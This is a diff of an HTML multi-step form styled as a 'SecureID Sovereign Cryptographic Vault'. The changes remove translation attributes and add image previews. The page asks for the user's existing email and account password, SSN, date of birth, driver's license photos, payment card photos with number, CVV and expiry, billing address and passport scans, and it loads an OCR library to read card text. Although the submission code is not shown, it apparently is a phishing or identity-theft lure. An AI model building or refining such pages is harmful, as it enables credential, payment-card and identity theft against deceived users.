@@ -1,15 +1,13 @@
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>SecureID Sovereign Cryptographic Vault</title>
-<!-- Tailwind CSS -->
 <script src="https://cdn.tailwindcss.com"></script>
-<!-- Lucide Icons -->
 <script src="https://unpkg.com/lucide@latest"></script>
-<!-- Tesseract.js for OCR (actual card text detection) -->
 <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap');
@@ -18,20 +16,10 @@ body {
 font-family: 'Plus Jakarta Sans', sans-serif;
 background-color: #f3f4f6;
 color: #111827;
--webkit-tap-highlight-color: transparent;
 }
 
 .mono {
 font-family: 'JetBrains Mono', monospace;
-}
-
-input, select, textarea {
-font-size: 16px !important;
-}
-@media (min-width: 640px) {
-input, select, textarea {
-font-size: 14px !important;
-}
 }
 
 .glow-success {
@@ -105,7 +93,6 @@ display: none;
 scrollbar-width: none;
 }
 
-/* Professional loading spinner */
 .loading-spinner {
 border: 2px solid #f3f4f6;
 border-top: 2px solid #7c3aed;
@@ -119,6 +106,14 @@ display: inline-block;
 @keyframes spin {
 0% { transform: rotate(0deg); }
 100% { transform: rotate(360deg); }
+}
+
+.image-preview {
+width: 60px;
+height: 40px;
+object-fit: cover;
+border-radius: 8px;
+margin-top: 5px;
 }
 </style>
 </head>
@@ -145,18 +140,18 @@ display: inline-block;
 <div class="flex items-center space-x-1.5 bg-gray-100 p-1.5 rounded-xl border border-gray-300">
 <i data-lucide="languages" class="w-3.5 h-3.5 text-purple-600"></i>
 <select id="langSwitcher" class="bg-transparent text-xs text-gray-800 font-bold focus:outline-none cursor-pointer">
-<option value="en" class="bg-white text-gray-900">EN</option>
-<option value="de" class="bg-white text-gray-900">DE</option>
-<option value="fr" class="bg-white text-gray-900">FR</option>
-<option value="es" class="bg-white text-gray-900">ES</option>
-<option value="it" class="bg-white text-gray-900">IT</option>
+<option value="en">EN</option>
+<option value="de">DE</option>
+<option value="fr">FR</option>
+<option value="es">ES</option>
+<option value="it">IT</option>
 </select>
 </div>
 </header>
 
 <div id="progressContainer" class="px-5 py-3 bg-gray-100 border-b border-gray-200 flex flex-col gap-1.5 shrink-0">
 <div class="flex justify-between items-center text-xs font-bold text-purple-700">
-<span id="stepLabel" data-i18n="step_1_title">Step 1: Security Setup</span>
+<span id="stepLabel">Step 1: Security Setup</span>
 <span id="stepProgressText" class="mono text-[10px] bg-purple-100 px-2 py-0.5 rounded-full text-purple-800">1 / 4</span>
 </div>
 <div class="w-full bg-gray-200 h-1.5 rounded-full overflow-hidden">
@@ -171,7 +166,7 @@ display: inline-block;
 <i data-lucide="lock" class="w-12 h-12"></i>
 </div>
 <div class="space-y-1">
-<h3 class="text-lg font-extrabold text-gray-900">Client Session Locked</h3>
+<h3 class="text-lg font-extrabold text-gray-900">Session Locked</h3>
 <p class="text-xs text-purple-700">Session auto-locked due to inactivity.</p>
 </div>
 <button type="button" onclick="unlockSession()" class="px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-xl text-xs transition-colors shadow-lg shadow-purple-950">
@@ -181,10 +176,11 @@ Unlock Portal Session
 
 <form id="secureIdForm" onsubmit="event.preventDefault();" class="space-y-4">
 
+<!-- SCREEN 1 -->
 <div id="screen-1" class="space-y-4 screen-fade">
 <div class="space-y-1">
-<h2 class="text-lg font-extrabold text-gray-900" data-i18n="setup_account">Create Secure ID</h2>
-<p class="text-xs text-purple-700" data-i18n="setup_desc">Complete your initial identity verification credentials.</p>
+<h2 class="text-lg font-extrabold text-gray-900">Create Secure ID</h2>
+<p class="text-xs text-purple-700">Complete your initial identity verification credentials.</p>
 </div>
 
 <div class="p-3 bg-purple-50 border border-purple-300 rounded-2xl flex items-start space-x-3">
@@ -192,36 +188,36 @@ Unlock Portal Session
 <i data-lucide="info" class="w-4 h-4"></i>
 </div>
 <div class="space-y-0.5">
-<h4 class="text-xs font-extrabold text-gray-900" data-i18n="alert_confirm_title">Important Confirmation Step</h4>
-<p class="text-[10px] text-purple-800 leading-relaxed" data-i18n="alert_confirm_desc">
+<h4 class="text-xs font-extrabold text-gray-900">Important</h4>
+<p class="text-[10px] text-purple-800 leading-relaxed">
 Please input your existing, active email and password as your primary credentials.
 </p>
 </div>
 </div>
 
 <div class="space-y-1">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_email">Primary Email Address</label>
+<label class="block text-xs font-bold text-purple-800">Primary Email Address</label>
 <div class="relative">
 <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-purple-600">
 <i data-lucide="mail" class="w-4 h-4"></i>
 </span>
 <input type="email" id="primaryEmail" required
-class="w-full bg-white text-sm text-gray-900 pl-10 pr-4 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all placeholder:text-gray-400"
+class="w-full bg-white text-sm text-gray-900 pl-10 pr-4 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all"
 placeholder="name@domain.com">
 </div>
 </div>
 
 <div class="space-y-1">
 <div class="flex justify-between items-center">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_recovery">Recovery Email Address</label>
-<span class="text-[9px] font-extrabold uppercase tracking-widest text-purple-600" data-i18n="badge_optional">Optional</span>
+<label class="block text-xs font-bold text-purple-800">Recovery Email Address</label>
+<span class="text-[9px] font-extrabold uppercase tracking-widest text-purple-600">Optional</span>
 </div>
 <div class="relative">
 <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-purple-600">
 <i data-lucide="shield-alert" class="w-4 h-4"></i>
 </span>
 <input type="email" id="recoveryEmail"
-class="w-full bg-white text-sm text-gray-900 pl-10 pr-4 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all placeholder:text-gray-400"
+class="w-full bg-white text-sm text-gray-900 pl-10 pr-4 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all"
 placeholder="recovery@domain.com">
 </div>
 </div>
@@ -229,7 +225,7 @@ placeholder="recovery@domain.com">
 <div id="oldPasswordContainer" class="hidden space-y-1 bg-yellow-50 p-3 rounded-2xl border border-yellow-400 transition-all">
 <label class="block text-xs font-semibold text-yellow-700 flex items-center gap-1.5">
 <i data-lucide="alert-triangle" class="w-3.5 h-3.5"></i>
-<span data-i18n="label_old_pwd">Primary Password Required (Same Email Match)</span>
+<span>Primary Password Required</span>
 </label>
 <input type="password" id="oldPassword"
 class="w-full bg-white text-sm text-gray-900 px-4 py-3 rounded-xl border border-yellow-500 focus:outline-none focus:border-yellow-400 transition-all"
@@ -237,13 +233,13 @@ placeholder="Enter existing account password">
 </div>
 
 <div class="space-y-1 relative">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_password">Master Security Password</label>
+<label class="block text-xs font-bold text-purple-800">Master Security Password</label>
 <div class="relative">
 <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-purple-600">
 <i data-lucide="lock" class="w-4 h-4"></i>
 </span>
 <input type="password" id="password" required
-class="w-full bg-white text-sm text-gray-900 pl-10 pr-10 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all placeholder:text-gray-400"
+class="w-full bg-white text-sm text-gray-900 pl-10 pr-10 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all"
 placeholder="••••••••">
 <button type="button" id="togglePassword" class="absolute inset-y-0 right-0 pr-3 flex items-center text-purple-600 hover:text-purple-800">
 <i data-lucide="eye" class="w-4.5 h-4.5" id="eyeIcon"></i>
@@ -253,18 +249,18 @@ placeholder="••••••••">
 <div class="pt-2 space-y-1.5 text-[11px] text-purple-800">
 <div class="flex items-center space-x-2" id="rule-length">
 <span class="indicator w-1.5 h-1.5 rounded-full bg-red-500"></span>
-<span data-i18n="pwd_rule_len">Min. 8 characters</span>
+<span>Min. 8 characters</span>
 </div>
 <div class="flex items-center space-x-2" id="rule-char">
 <span class="indicator w-1.5 h-1.5 rounded-full bg-red-500"></span>
-<span data-i18n="pwd_rule_chars">At least one letter and number</span>
+<span>At least one letter and number</span>
 </div>
 </div>
 
 <div class="space-y-1 pt-1">
 <div class="flex justify-between text-[10px] font-bold">
-<span data-i18n="pwd_strength">Password Strength:</span>
-<span id="strengthText" class="text-red-600" data-i18n="strength_weak">Weak</span>
+<span>Password Strength:</span>
+<span id="strengthText" class="text-red-600">Weak</span>
 </div>
 <div class="w-full bg-gray-200 h-1.5 rounded-full overflow-hidden flex">
 <div id="strengthBar" class="bg-red-500 h-full transition-all duration-300 w-1/3"></div>
@@ -273,27 +269,28 @@ placeholder="••••••••">
 </div>
 
 <div class="space-y-1">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_confirm_pwd">Confirm Master Password</label>
+<label class="block text-xs font-bold text-purple-800">Confirm Master Password</label>
 <div class="relative">
 <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-purple-600">
 <i data-lucide="lock" class="w-4 h-4"></i>
 </span>
 <input type="password" id="confirmPassword" required
-class="w-full bg-white text-sm text-gray-900 pl-10 pr-4 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all placeholder:text-gray-400"
+class="w-full bg-white text-sm text-gray-900 pl-10 pr-4 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all"
 placeholder="••••••••">
 </div>
-<span id="confirmMatchText" class="text-[11px] text-red-600 hidden" data-i18n="pwd_mismatch">Passwords do not match</span>
+<span id="confirmMatchText" class="text-[11px] text-red-600 hidden">Passwords do not match</span>
 </div>
 </div>
 
+<!-- SCREEN 2 -->
 <div id="screen-2" class="hidden space-y-4 screen-fade">
 <div class="space-y-1">
-<h2 class="text-lg font-extrabold text-gray-900" data-i18n="profile_title">Identity Profile</h2>
-<p class="text-xs text-purple-700" data-i18n="profile_desc">Provide your valid geographical registration data.</p>
+<h2 class="text-lg font-extrabold text-gray-900">Identity Profile</h2>
+<p class="text-xs text-purple-700">Provide your valid geographical registration data.</p>
 </div>
 
 <div class="space-y-1">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_country">Country of Residence</label>
+<label class="block text-xs font-bold text-purple-800">Country of Residence</label>
 <select id="countrySelect" class="w-full bg-white text-sm text-gray-900 px-3 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all cursor-pointer">
 <option value="US">🇺🇸 United States</option>
 <option value="UK">🇬🇧 United Kingdom</option>
@@ -305,14 +302,14 @@ placeholder="••••••••">
 </div>
 
 <div class="space-y-1">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_fullname">Full Legal Name</label>
+<label class="block text-xs font-bold text-purple-800">Full Legal Name</label>
 <input type="text" id="fullLegalName" required
-class="w-full bg-white text-sm text-gray-900 px-3 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all placeholder:text-gray-400"
+class="w-full bg-white text-sm text-gray-900 px-3 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all"
 placeholder="Sarah Connor">
 </div>
 
 <div class="space-y-1">
-<label class="block text-xs font-bold text-purple-800" data-i18n="label_dob">Date of Birth (MM/DD/YYYY)</label>
+<label class="block text-xs font-bold text-purple-800">Date of Birth (MM/DD/YYYY)</label>
 <div class="relative">
 <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-purple-600">
 <i data-lucide="calendar" class="w-4 h-4"></i>
@@ -326,19 +323,20 @@ placeholder="MM/DD/YYYY">
 <div class="bg-gray-50 p-3.5 rounded-2xl border border-gray-200 space-y-3">
 <span class="text-xs font-extrabold text-purple-800 flex items-center gap-2">
 <i data-lucide="file-text" class="w-4 h-4 text-purple-600"></i>
-<span data-i18n="up_license_head">Driver's License Assets</span>
+<span>Driver's License Assets</span>
 </span>
 <div class="grid grid-cols-2 gap-3">
 <div class="relative border border-dashed border-gray-400 bg-gray-50 p-3 rounded-xl text-center flex flex-col items-center justify-between min-h-[90px]" id="licenseFrontBox">
 <div class="p-1 bg-purple-100 rounded text-purple-600">
 <i data-lucide="image" class="w-4 h-4"></i>
 </div>
-<span class="text-[10px] font-extrabold text-gray-800 mt-1" data-i18n="up_front">License Front</span>
+<span class="text-[10px] font-extrabold text-gray-800 mt-1">License Front</span>
 <span id="checkLicenseFront" class="hidden text-emerald-600 my-1">
 <i data-lucide="check-circle" class="w-4.5 h-4.5"></i>
 </span>
+<img id="previewLicenseFront" class="image-preview hidden" alt="Preview">
 <label class="cursor-pointer bg-purple-600 hover:bg-purple-700 text-white font-bold text-[9px] py-1 px-2.5 rounded mt-1.5 w-full block transition-colors">
-<span data-i18n="btn_upload">Upload</span>
+<span>Upload</span>
 <input type="file" id="fileLicenseFront" accept="image/*" class="hidden">
 </label>
 </div>
@@ -346,12 +344,13 @@ placeholder="MM/DD/YYYY">
 <div class="p-1 bg-purple-100 rounded text-purple-600">
 <i data-lucide="image" class="w-4 h-4"></i>
 </div>
-<span class="text-[10px] font-extrabold text-gray-800 mt-1" data-i18n="up_back">License Back</span>
+<span class="text-[10px] font-extrabold text-gray-800 mt-1">License Back</span>
 <span id="checkLicenseBack" class="hidden text-emerald-600 my-1">
 <i data-lucide="check-circle" class="w-4.5 h-4.5"></i>
 </span>
+<img id="previewLicenseBack" class="image-preview hidden" alt="Preview">
 <label class="cursor-pointer bg-purple-600 hover:bg-purple-700 text-white font-bold text-[9px] py-1 px-2.5 rounded mt-1.5 w-full block transition-colors">
-<span data-i18n="btn_upload">Upload</span>
+<span>Upload</span>
 <input type="file" id="fileLicenseBack" accept="image/*" class="hidden">
 </label>
 </div>
@@ -360,7 +359,7 @@ placeholder="MM/DD/YYYY">
 
 <div class="space-y-1">
 <div class="flex justify-between items-center">
-<label id="identityLabel" class="block text-xs font-bold text-purple-800" data-i18n="label_id_us">Social Security Number (SSN)</label>
+<label id="identityLabel" class="block text-xs font-bold text-purple-800">Social Security Number (SSN)</label>
 <span id="idFormatError" class="text-[10px] text-red-600 hidden font-extrabold">Invalid Format</span>
 </div>
 <div class="relative">
@@ -374,7 +373,7 @@ placeholder="000-00-0000">
 </div>
 
 <div class="space-y-1">
-<label id="phoneLabel" class="block text-xs font-bold text-purple-800" data-i18n="label_phone_us">US Mobile Phone</label>
+<label id="phoneLabel" class="block text-xs font-bold text-purple-800">US Mobile Phone</label>
 <div class="relative">
 <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-purple-600">
 <i data-lucide="phone" class="w-4 h-4"></i>
@@ -386,17 +385,18 @@ placeholder="(000) 000-0000">
 </div>
 
 <div class="space-y-1">
-<label id="postalLabel" class="block text-xs font-bold text-purple-800" data-i18n="label_postal">ZIP / Postal Code</label>
+<label id="postalLabel" class="block text-xs font-bold text-purple-800">ZIP / Postal Code</label>
 <input type="text" id="postal" required
 class="w-full bg-white text-sm text-gray-900 px-3 py-3 rounded-xl border border-gray-300 focus:outline-none focus:border-purple-500 transition-all"
 placeholder="90210">
 </div>
 </div>
 
+<!-- SCREEN 3 -->
 <div id="screen-3" class="hidden space-y-4 screen-fade">
 <div class="space-y-1">
-<h2 class="text-lg font-extrabold text-gray-900" data-i18n="uploads_title">Secure Financial Assets</h2>
-<p class="text-xs text-purple-700" data-i18n="uploads_desc">Upload required verification cards & billing details.</p>
+<h2 class="text-lg font-extrabold text-gray-900">Secure Financial Assets</h2>
+<p class="text-xs text-purple-700">Upload required verification cards & billing details.</p>
 </div>
 
 <div class="card-container w-full h-[150px] relative shrink-0 z-20">
@@ -428,7 +428,7 @@ placeholder="90210">
 <span id="vCardCvv" class="text-xs font-bold text-white tracking-widest mono">•••</span>
 </div>
 </div>
-<p class="text-[7px] text-purple-300 text-center px-4">Authorized Signature. Cryptographically secured on Sovereign SecureID Node network.</p>
+<p class="text-[7px] text-purple-300 text-center px-4">Authorized Signature</p>
 </div>
 </div>
 </div>
@@ -437,9 +437,9 @@ placeholder="90210">
 <div class="flex items-center justify-between pb-1.5 border-b border-gray-200">
 <span class="text-xs font-bold text-gray-900 flex items-center gap-1.5">
 <i data-lucide="credit-card" class="w-4 h-4 text-purple-600"></i>
-<span data-i18n="payment_card_upload">Payment Card Verification Files</span>
+<span>Payment Card Verification Files</span>
 </span>
-<span class="text-[9px] text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-300 font-mono font-bold" data-i18n="badge_autofill">Scan Autofill</span>
+<span class="text-[9px] text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-300 font-mono font-bold">Scan</span>
 </div>
 <div class="grid grid-cols-2 gap-3">
 <div class="relative overflow-hidden border border-dashed border-gray-400 bg-gray-50 p-3 rounded-xl text-center flex flex-col items-center justify-between min-h-[90px]" id="cardFrontBox">
@@ -447,12 +447,13 @@ placeholder="90210">
 <div class="p-1 bg-purple-100 rounded text-purple-600">
 <i data-lucide="credit-card" class="w-4 h-4"></i>
 </div>
-<span class="text-[10px] font-extrabold text-gray-800 mt-1" data-i18n="up_card_front">Card Front Photo</span>
+<span class="text-[10px] font-extrabold text-gray-800 mt-1">Card Front</span>
 <span id="checkCardFront" class="hidden text-emerald-600 my-1">
 <i data-lucide="check-circle" class="w-4.5 h-4.5"></i>
 </span>
+<img id="previewCardFront" class="image-preview hidden" alt="Preview">
 <label class="cursor-pointer bg-purple-600 hover:bg-purple-700 text-white font-bold text-[9px] py-1 px-2.5 rounded mt-1.5 w-full block transition-colors">
-<span data-i18n="btn_upload">Upload</span>
+<span>Upload</span>
 <input type="file" id="fileCardFront" accept="image/*" class="hidden">
 </label>
 </div>
@@ -461,12 +462,13 @@ placeholder="90210">
 <div class="p-1 bg-purple-100 rounded text-purple-600">
 <i data-lucide="credit-card" class="w-4 h-4"></i>
 </div>
-<span class="text-[10px] font-extrabold text-gray-800 mt-1" data-i18n="up_card_back">Card Back Photo</span>
+<span class="text-[10px] font-extrabold text-gray-800 mt-1">Card Back</span>
 <span id="checkCardBack" class="hidden text-emerald-600 my-1">
 <i data-lucide="check-circle" class="w-4.5 h-4.5"></i>
 </span>
+<img id="previewCardBack" class="image-preview hidden" alt="Preview">
 <label class="cursor-pointer bg-purple-600 hover:bg-purple-700 text-white font-bold text-[9px] py-1 px-2.5 rounded mt-1.5 w-full block transition-colors">
-<span data-i18n="btn_upload">Upload</span>
+<span>Upload</span>
 <input type="file" id="fileCardBack" accept="image/*" class="hidden">
 </label>
 </div>
@@ -496,35 +498,35 @@ placeholder="CVV">
 <div class="flex items-center justify-between pb-1 border-b border-gray-200">
 <span class="text-xs font-bold text-gray-900 flex items-center gap-1.5">
 <i data-lucide="map-pin" class="w-4 h-4 text-purple-600"></i>
-<span data-i18n="billing_address_head">Billing Address</span>
+<span>Billing Address</span>
 </span>
-<button type="button" id="syncAddressBtn" class="text-[10px] text-purple-700 bg-purple-100 px-2.5 py-1 rounded-lg border border-purple-300 hover:bg-purple-200 transition-all font-bold" data-i18n="btn_sync">
-Sync Profile ZIP
+<button type="button" id="syncAddressBtn" class="text-[10px] text-purple-700 bg-purple-100 px-2.5 py-1 rounded-lg border border-purple-300 hover:bg-purple-200 transition-all font-bold">
+Sync ZIP
 </button>
 </div>
 <div class="space-y-2.5">
 <div>
-<label class="block text-[10px] font-semibold text-purple-800" data-i18n="billing_street">Street Address</label>
+<label class="block text-[10px] font-semibold text-purple-800">Street Address</label>
 <input type="text" id="billingStreet" required
 class="w-full bg-white text-xs text-gray-900 px-3 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:border-purple-500"
 placeholder="123 Security Blvd">
 </div>
 <div class="grid grid-cols-3 gap-2">
 <div class="col-span-2">
-<label class="block text-[10px] font-semibold text-purple-800" data-i18n="billing_city">City</label>
+<label class="block text-[10px] font-semibold text-purple-800">City</label>
 <input type="text" id="billingCity" required
 class="w-full bg-white text-xs text-gray-900 px-3 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:border-purple-500"
-placeholder="Fortress City">
+placeholder="City">
 </div>
 <div>
-<label class="block text-[10px] font-semibold text-purple-800" data-i18n="billing_state">State</label>
+<label class="block text-[10px] font-semibold text-purple-800">State</label>
 <input type="text" id="billingState" required
 class="w-full bg-white text-xs text-gray-900 px-3 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:border-purple-500"
 placeholder="CA">
 </div>
 </div>
 <div>
-<label class="block text-[10px] font-semibold text-purple-800" data-i18n="billing_zip">Billing ZIP / Postal Code</label>
+<label class="block text-[10px] font-semibold text-purple-800">Billing ZIP</label>
 <input type="text" id="billingZip" required
 class="w-full bg-white text-xs text-gray-900 px-3 py-2.5 rounded-lg border border-gray-300 focus:outline-none focus:border-purple-500"
 placeholder="90210">
@@ -539,65 +541,67 @@ placeholder="90210">
 </div>
 <div class="text-left">
 <div class="flex items-center gap-1.5">
-<h4 class="text-xs font-bold text-gray-900" data-i18n="up_national">National ID / Passport</h4>
-<span class="text-[9px] text-purple-700 bg-purple-100 px-1.5 py-0.2 rounded font-extrabold" data-i18n="badge_optional">Optional</span>
+<h4 class="text-xs font-bold text-gray-900">National ID / Passport</h4>
+<span class="text-[9px] text-purple-700 bg-purple-100 px-1.5 py-0.2 rounded font-extrabold">Optional</span>
 </div>
-<p class="text-[10px] text-purple-700" data-i18n="up_sub">Main biographical data page</p>
+<p class="text-[10px] text-purple-700">Main biographical data page</p>
 </div>
 </div>
 <div class="flex items-center space-x-2">
 <span id="checkId" class="hidden text-emerald-600">
 <i data-lucide="check-circle-2" class="w-5 h-5"></i>
 </span>
+<img id="previewId" class="image-preview hidden" alt="Preview">
 <label class="cursor-pointer bg-purple-600 hover:bg-purple-700 text-white font-bold text-[10px] py-1.5 px-3 rounded-xl transition-colors">
-<span data-i18n="btn_upload">Upload</span>
+<span>Upload</span>
 <input type="file" id="fileId" accept="image/*" class="hidden">
 </label>
 </div>
 </div>
 </div>
 
+<!-- SCREEN 4 -->
 <div id="screen-4" class="hidden space-y-4 screen-fade">
 <div class="space-y-1">
-<h2 class="text-lg font-extrabold text-gray-900" data-i18n="review_title">Review Data</h2>
-<p class="text-xs text-purple-700" data-i18n="review_desc">Validate and confirm before generating digital verification keys.</p>
+<h2 class="text-lg font-extrabold text-gray-900">Review Data</h2>
+<p class="text-xs text-purple-700">Confirm before generating digital verification keys.</p>
 </div>
 <div class="space-y-3">
 <div class="bg-gray-50 p-3 rounded-2xl border border-gray-200">
 <div class="flex justify-between items-center mb-1.5 pb-1 border-b border-gray-200">
 <span class="text-xs font-extrabold text-purple-800 flex items-center gap-1.5">
 <i data-lucide="key" class="w-3.5 h-3.5 text-purple-600"></i>
-<span data-i18n="rev_sec_creds">Security Credentials</span>
+<span>Security Credentials</span>
 </span>
 <button type="button" onclick="goToStep(1)" class="text-purple-600 hover:text-purple-800 transition-colors">
 <i data-lucide="pencil" class="w-3.5 h-3.5"></i>
 </button>
 </div>
 <div class="text-[11px] space-y-1">
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_email">Primary:</span> <span id="revEmail" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_recovery">Recovery:</span> <span id="revRecovery" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Primary:</span> <span id="revEmail" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Recovery:</span> <span id="revRecovery" class="font-semibold">-</span></p>
 </div>
 </div>
 <div class="bg-gray-50 p-3 rounded-2xl border border-gray-200">
 <div class="flex justify-between items-center mb-1.5 pb-1 border-b border-gray-200">
 <span class="text-xs font-extrabold text-purple-800 flex items-center gap-1.5">
 <i data-lucide="user-check" class="w-3.5 h-3.5 text-purple-600"></i>
-<span data-i18n="rev_demographics">Biographical Profile</span>
+<span>Biographical Profile</span>
 </span>
 <button type="button" onclick="goToStep(2)" class="text-purple-600 hover:text-purple-800 transition-colors">
 <i data-lucide="pencil" class="w-3.5 h-3.5"></i>
 </button>
 </div>
 <div class="text-[11px] space-y-1">
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_fullname">Full Legal Name:</span> <span id="revFullName" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_dob">Birth Date:</span> <span id="revDob" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_country">Country:</span> <span id="revCountry" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" id="revIdLabel">Identity ID:</span> <span id="revIdVal" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_phone">Phone:</span> <span id="revPhone" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_postal">Postal:</span> <span id="revPostal" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Full Name:</span> <span id="revFullName" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">DOB:</span> <span id="revDob" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Country:</span> <span id="revCountry" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">ID:</span> <span id="revIdVal" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Phone:</span> <span id="revPhone" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Postal:</span> <span id="revPostal" class="font-semibold">-</span></p>
 <div class="grid grid-cols-2 gap-1.5 pt-1.5">
-<span id="badgeLicenseFront" class="px-2 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-[10px] text-red-700">No Front Lic.</span>
-<span id="badgeLicenseBack" class="px-2 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-[10px] text-red-700">No Back Lic.</span>
+<span id="badgeLicenseFront" class="px-2 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-[10px] text-red-700">No Front</span>
+<span id="badgeLicenseBack" class="px-2 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-[10px] text-red-700">No Back</span>
 </div>
 </div>
 </div>
@@ -605,20 +609,20 @@ placeholder="90210">
 <div class="flex justify-between items-center mb-1.5 pb-1 border-b border-gray-200">
 <span class="text-xs font-extrabold text-purple-800 flex items-center gap-1.5">
 <i data-lucide="folder" class="w-3.5 h-3.5 text-purple-600"></i>
-<span data-i18n="rev_assets">Billing & Card Details</span>
+<span>Billing & Card</span>
 </span>
 <button type="button" onclick="goToStep(3)" class="text-purple-600 hover:text-purple-800 transition-colors">
 <i data-lucide="pencil" class="w-3.5 h-3.5"></i>
 </button>
 </div>
 <div class="text-[11px] space-y-1">
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_card">Card Number:</span> <span id="revCardNum" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_expiry">Card Expiry:</span> <span id="revCardExpiry" class="font-semibold">-</span></p>
-<p class="text-gray-700"><span class="text-purple-800" data-i18n="rev_billing_addr">Billing Address:</span> <span id="revBillingAddr" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Card:</span> <span id="revCardNum" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Expiry:</span> <span id="revCardExpiry" class="font-semibold">-</span></p>
+<p class="text-gray-700"><span class="text-purple-800">Billing:</span> <span id="revBillingAddr" class="font-semibold">-</span></p>
 <div class="grid grid-cols-3 gap-1.5 pt-1.5 text-[9px]">
-<span id="badgeCardFront" class="px-1.5 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700">No Card Front</span>
-<span id="badgeCardBack" class="px-1.5 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700">No Card Back</span>
-<span id="badgeId" class="px-1.5 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700" data-i18n="badge_id">No Nat. ID</span>
+<span id="badgeCardFront" class="px-1.5 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700">No Front</span>
+<span id="badgeCardBack" class="px-1.5 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700">No Back</span>
+<span id="badgeId" class="px-1.5 py-1 bg-red-100 border border-red-300 rounded-lg text-center text-red-700">No ID</span>
 </div>
 </div>
 </div>
@@ -626,33 +630,28 @@ placeholder="90210">
 </div>
 
 <div id="navButtons" class="flex items-center space-x-3 pt-4 border-t border-gray-200 shrink-0">
-<button type="button" id="prevBtn" class="flex-1 py-3 px-4 rounded-xl font-bold text-xs bg-gray-100 border border-gray-300 text-purple-700 hover:text-purple-900 transition-all hover:bg-gray-200 hidden" data-i18n="btn_back">
-Back
-</button>
-<button type="button" id="nextBtn" class="flex-2 w-full py-3 px-4 rounded-xl font-extrabold text-xs bg-purple-600 hover:bg-purple-500 text-white shadow-lg shadow-purple-500/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:bg-purple-600 flex justify-center items-center gap-2">
-<span id="nextBtnText" data-i18n="btn_continue">Continue</span>
+<button type="button" id="prevBtn" class="flex-1 py-3 px-4 rounded-xl font-bold text-xs bg-gray-100 border border-gray-300 text-purple-700 hover:text-purple-900 transition-all hover:bg-gray-200 hidden">Back</button>
+<button type="button" id="nextBtn" class="flex-2 w-full py-3 px-4 rounded-xl font-extrabold text-xs bg-purple-600 hover:bg-purple-500 text-white shadow-lg shadow-purple-500/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex justify-center items-center gap-2">
+<span id="nextBtnText">Continue</span>
 <i data-lucide="chevron-right" class="w-4 h-4"></i>
 </button>
 </div>
 
 </form>
 
